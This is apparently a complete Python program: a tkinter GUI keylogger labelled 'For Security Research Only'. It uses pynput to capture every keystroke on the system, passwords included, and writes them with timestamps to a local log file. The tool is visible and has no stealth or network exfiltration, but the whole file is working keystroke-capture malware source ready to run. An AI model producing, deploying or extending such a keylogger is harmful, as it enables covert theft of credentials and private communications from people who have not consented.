import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import datetime
import os
import webbrowser

LOG_FILE = "keylog.txt"

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        self.running = False

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            self.log += f" [{key}] "
        self.write_to_file()

    def write_to_file(self):
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"{timestamp} - {self.log}\n")
            self.log = ""

    def start_logging(self):
        if not self.running:
            self.running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.running = False

# GUI App
class KeyLoggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Keylogger Software - Security Research Tool")
        self.root.geometry("400x300")
        self.root.configure(bg="#eaf0f1")

        self.kl = KeyLogger()

        tk.Label(root, text="Keylogger Tool", font=("Arial", 16, "bold"), bg="#eaf0f1").pack(pady=20)
        tk.Label(root, text="For Security Research Only", font=("Arial", 10), bg="#eaf0f1", fg="red").pack(pady=5)

        self.status = tk.Label(root, text="Status: Idle", bg="#eaf0f1", font=("Arial", 12))
        self.status.pack(pady=10)

        tk.Button(root, text="Start Logging", bg="#2ecc71", fg="white", command=self.start).pack(pady=10)
        tk.Button(root, text="Stop Logging", bg="#e74c3c", fg="white", command=self.stop).pack(pady=5)
        tk.Button(root, text="Open Log File", bg="#3498db", fg="white", command=self.open_log).pack(pady=10)

    def start(self):
        self.kl.start_logging()
        self.status.config(text="Status: Logging...")

    def stop(self):
        self.kl.stop_logging()
        self.status.config(text="Status: Stopped")
        messagebox.showinfo("Logging Stopped", f"Keystrokes saved to {LOG_FILE}")

    def open_log(self):
        if os.path.exists(LOG_FILE):
            webbrowser.open(LOG_FILE)
        else:
            messagebox.showerror("No Log Found", "The keylog file was not created yet.")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerApp(root)
    root.mainloop()
